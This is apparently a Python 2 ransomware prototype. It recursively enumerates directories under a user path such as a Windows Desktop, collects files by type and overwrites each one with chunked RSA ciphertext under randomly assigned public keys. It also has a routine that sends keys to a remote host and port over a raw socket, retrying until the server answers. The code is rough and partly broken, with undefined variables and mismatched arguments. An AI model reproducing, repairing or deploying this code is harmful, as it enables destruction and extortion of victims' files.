# -*- coding: utf-8 -*-


import rsa
import base64
import sys,os
import socket
from multiprocessing.dummy import Pool as thread_pool
import time
import glob
from multiprocessing import Pool as process_pool
import subprocess
import re
import Queue
import random


try:
	import psutil
except Exception,e:
	pass


path = os.path.abspath(sys.argv[0])[:-len(os.path.basename(__file__))] #基础文件名字前面那么部分就是当前所在的目录

diffQ=Queue.Queue(0)
diffQA=Queue.Queue(0)


#---------------------------------------------------------------------------------

typegather=Queue.Queue(0)


def file_type_gather(file_paths):
	try:
		if len(str(filetype_path))>2 and len(filetype)==0:
			with open(filetype_path) as filetp:
				filetype=[types for types in filetp.readlines()]
				
		elif len(filetype)>0:
			pass
		else:
			filetype=["xxx",]
	except Exception,e:
		pass
		print ("filetype loading error")

	for To_be_crypto_file_type in filetype:#遍历文件类型
		glob_list=glob.glob(file_paths+r"\\"+"*."+"xxx")
		for i_wanna in glob_list:
			typegather.put(i_wanna)

def mulit_type_gather(filepath):
	typepool=thread_pool(16)
	try:
		typepool.map(file_type_gather,filepath)
	except Exception,e:pass;

	mylist=[]
	while not typegather.empty():
		mylist.append(typegather.get())
	print mylist
	return mylist
	typepool.close()


#---------------------------------------------------------------------------------


def creat_keypair(key_bits_tuple):
	#创建钥匙
	(key_bits,keypair_file)=key_bits_tuple
	keypair_file=open(keypair_file,"a")
	(publickey,privatekey)=rsa.newkeys(key_bits)
	keypair_file.write(publickey.save_pkcs1()+"\n"+privatekey.save_pkcs1()+"\n"*3)
	keypair_file.close()

#线程并发生成钥匙对
def creat_keypair_mulitthreading(how_many_pairs,paths):
	#created file and a+
	the_path="keypair_file"+time.ctime().replace(":",".")+".pem"
	keypair_file=open(the_path,"w+")
	Pools=thread_pool(16)
	Pools.map(creat_keypair,[(2048,str(the_path))]*int(how_many_pairs))
	Pools.close()


#---------------------------------------------------------------------------------


def crypto(target_file_keypair):
	#获取公匙
	(target_file,keypair_pub)=target_file_keypair
	#开始加密
	templist=[]
	writelist=[]
	if 1:
		target=open(target_file,"r+")
		while 1:
			inside_ = target.read(240);
			if not inside_:
				break;
			templist.append(inside_);
		target.close()

		target=open(target_file,"w+")
		for inside__ in templist:
			#rsa.PrivateKey.load_pkcs1()
			crypto=rsa.encrypt(inside__,rsa.PublicKey.load_pkcs1(keypair_pub));
			writelist.append(crypto);

		if not len(writelist)==0:
			print time.ctime()
		for written in writelist:
			target.write(base64.b64encode(written)+" "*6)

		target.write("\n"+base64.b64encode(keypair_pub))

		
		target.close()#关闭目标加密文件

		#切开文件长度 rsa只能加密明文长度为 2048→245(max) 1024→117(max)				
	print "creat success"
	#print base64.b64encode(rsa.sign(msg, privatekey, 'SHA-1'))

def mulit_process_crypto(pool,keypair_file,target_file_list):
	Ppool=process_pool(pool)

	#read keypair and divide 
	keypair_file=open(keypair_file,'r')
	key=keypair_file.read()
	keypair_file.close()

	keypair=[suitable.strip()[1:] for suitable in re.findall("-[^]*[^-]*",key) if len(suitable)>100]

	#tuple pub and priv
	rebulid=["-----BEGIN RSA PUBLIC KEY-----"+str(keypair[i])+"\n"+"-----END RSA PUBLIC KEY-----" for i in range(len(keypair)) if  i%2==0]
	rebulid2=["-----BEGIN RSA PRIVATE KEY-----"+str(keypair[i])+"\n"+"-----END RSA PRIVATE KEY-----" for i in range(len(keypair)) if not i%2==0]
	lists=[]
	keylist=[]
	for x in range(len(rebulid)):
		lists.append(rebulid[x])
		lists.append(rebulid2[x])
		keylist.append(tuple(lists))
		lists=[]


	#tuple keypair and target_file
	tuple_list=[]
	tuples=[]

	target_file_listx=target_file_list
	print type("target_file_listx")
	for w in target_file_listx:
		tuples.append(w)
		tuples.append(rebulid[int(random.randint(0,len(rebulid)-1))])
		tuple_list.append(tuples)
		tuples=[]

	#传入tuple即可 用法 tuple([1,2,3,4,5,6,7])
	

	Ppool.map(crypto,tuple_list)
	Ppool.close()


#---------------------------------------------------------------------------------

def upload_keyA(keyA,HOST,PROT):
	#先检测服务器有没有开
	socket_post=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	while 1:
		try:
			socket_post.connect((HOST,PROT))
			print ("targe service is running,we can send the private key now")
			break
		except Exception as e:
			print ("target service was closed,plz wait for a while. 60s each time")
			time.sleep(60)


	#目标服务器已经开启 开启发送 多次发送以保证 安全送到
	try:
		for safe_time in range(11):
			upload_key=keyA
			
			socket_post.connect((HOST,PROT))
			socket_post.send(upload_key+"\n"+safe_time)
	except:
		pass


#---------------------------------------------------------------------------------


#路径爆破
def sysinfo_path(paths):
	if paths[-1]=="\\":
		under_the_path=os.listdir(paths[:-1])
	else:
		under_the_path=os.listdir(paths)

	dirlist=[paths+"\\"+each_path for each_path in under_the_path if  os.path.isdir(paths+"\\"+each_path)]
	for q in dirlist:
		diffQ.put(q)
		diffQA.put(q)
#启用多线程并发爆破
def mulit_threading_search_path(start_path):
	SPpool=thread_pool(8)
	templist=[]
	templist2=[]
	sysinfo_path(start_path)
	while not diffQ.empty() or not diffQA.empty():
		templist.append(diffQ.get())
		try:
			SPpool.map(sysinfo_path,templist)
		except Exception,e:pass;
# if you pool.close() too early something mistakes will happen for example, assertionerror. 
#Because you close before it complete,in reality we do not need close.
#Close() -- Prevents any more tasks from being submitted to the pool. Once all the tasks have been completed the worker processes will exit.
			
		templist=[]
		templist2.append(diffQA.get())
	print len(templist2)
	return templist2
	SPpool.close()

#---------------------------------------------------------------------------------


def argparse(argv):
	import getopt
	try:
		opts, args = getopt.getopt(argv,"hc:u:k:",["crypto=","uploadkey=","keypairs="])
	except getopt.GetoptError:
		print 'rsa-crypto.py Usage: -c (<process pool size> <keypair file> <crypto file type> <target path>)  or --crypto (<process pool size> <keypair file> <crypto file type> <target path>)'
		print "                     -u (<keypair file> <host> <port>) --uploadkey (<keypair file> <host> <port>)"
		print "                     -k (<bits> <path>)[where you wanna set the keypairs file] --keypairs (<bits> <path>)[where you wanna set the keypairs file]"
		print "                     Remember use () to set the argv"
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print 'rsa-crypto.py Usage: -c (<process pool size> <keypair file> <crypto file type> <target path>)  or --crypto (<process pool size> <keypair file> <crypto file type> <target path>)'
			print "                     -u (<keypair file> <host> <port>) --uploadkey (<keypair file> <host> <port>)"
			print "                     -k (<bits> <path>)[where you wanna set the keypairs file] --keypairs (<bits> <path>)[where you wanna set the keypairs file]"
			print "                     Remember use () to set the argv"
			sys.exit()
		elif opt in ("-c", "--crypto"):
			argx=arg.strip("()").split(",")
			try:

				mulit_process_crypto(argx[0],argx[1])
			except Exception as e:
				print "error",e
				print 'rsa-crypto.py Usage: -c (<process pool size> <keypair file> <crypto file type> <target path>)  or --crypto (<process pool size> <keypair file> <crypto file type> <target path>)'
				print "                     -u (<keypair file> <host> <port>) --uploadkey (<keypair file> <host> <port>)"
				print "                     -k (<bits> <path>)[where you wanna set the keypairs file] --keypairs (<bits> <path>)[where you wanna set the keypairs file]"
				print "                     Remember use () to set the argv"
				sys.exit(2)
		elif opt in ("-k", "--keypairs"):
			argx=arg.strip("()").split(",")
			try:
				filetype_path=argx[2]
				global filetype_path
				mulit_type_gather(mulit_threading_search_path(argx[3]))
				creat_keypair_mulitthreading(argx[0],argx[1])
			except Exception as e:
				print "error",e
				print 'rsa-crypto.py Usage: -c (<process pool size> <keypair file> <crypto file type> <target path>)  or --crypto (<process pool size> <keypair file> <crypto file type> <target path>)'
				print "                     -u (<keypair file> <host> <port>) --uploadkey (<keypair file> <host> <port>)"
				print "                     -k (<bits> <path>)[where you wanna set the keypairs file] --keypairs (<bits> <path>)[where you wanna set the keypairs file]"
				print "                     Remember use () to set the argv"
				sys.exit(2)
			
		elif opt in ("-u", "--uploadkey"):
			argx=arg.strip("()").split(",")
			try:
				upload_keyA(argx[0],argx[1],argx[2])
			except Exception as e:
				print "error",e
				print 'rsa-crypto.py Usage: -c (<process pool size> <keypair file> <crypto file type> <target path>)  or --crypto (<process pool size> <keypair file> <crypto file type> <target path>)'
				print "                     -u (<keypair file> <host> <port>) --uploadkey (<keypair file> <host> <port>)"
				print "                     -k (<bits> <path>)[where you wanna set the keypairs file] --keypairs (<bits> <path>)[where you wanna set the keypairs file]"
				print "                     Remember use () to set the argv"
				sys.exit(2)
			
			


#---------------------------------------------------------------------------------



if __name__ == '__main__':
	filetype_path=r""
	argparse(sys.argv[1:])
	#mulit_process_crypto(5,r"keypair_fileSun Nov 06 12.01.12 2016.pem",mulit_type_gather(mulit_threading_search_path(r"C:\Users\hasee\Desktop")))
	#creat_keypair_mulitthreading(10)
	#mulit_type_gather(mulit_threading_search_path(r"C:\Users\hasee\Desktop"))
	#creat_keypair_mulitthreading(3)

	#!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!-!
	'''
	Usage:
	creat_keypair_mulitthreading(how_manys_pool_you_allpw)
	mulit_type_gather(path)
	mulit_threading_search_path(path)
	creat_keypair_mulitthreading(how many keypairs)
	mulit_process_crypto(how many pool,key path,target path)
	upload_keyA(key,host,port)

	'''

